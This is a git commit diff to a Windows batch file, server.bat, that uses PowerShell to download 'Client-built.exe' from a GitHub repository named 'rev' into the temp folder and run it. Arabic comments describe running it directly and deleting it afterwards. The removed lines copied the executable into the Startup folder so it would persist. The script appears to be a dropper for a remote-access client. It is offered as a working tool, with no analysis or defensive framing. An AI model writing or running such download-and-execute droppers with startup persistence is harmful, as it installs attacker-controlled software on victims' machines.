ea6ad9334347d63f6ec7edd0ee633ced23eba6d2
TiraUndercoder <128243843+tiraUnderCode@users.noreply.github.com>
2024-09-14 13:54:01 +0300

    Update server.bat

--- server.bat
+++ server.bat
@@ -1,21 +1,15 @@
 @echo off
 setlocal
 
-
 set "url=https://github.com/tiraUnderCode/rev/raw/main/Client-built.exe"
 set "tempFile=%temp%\Client-built.exe"
-set "startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
-
 
 powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%tempFile%'"
 
+:: تنفيذ الملف مباشرة دون نقله إلى مجلد البداية التلقائي
+start "" "%tempFile%"
 
-copy "%tempFile%" "%startupFolder%"
-
-
-start "" "%startupFolder%\Client-built.exe"
-
-
+:: حذف الملف المؤقت بعد تنفيذه
 del "%tempFile%"
 
 endlocal
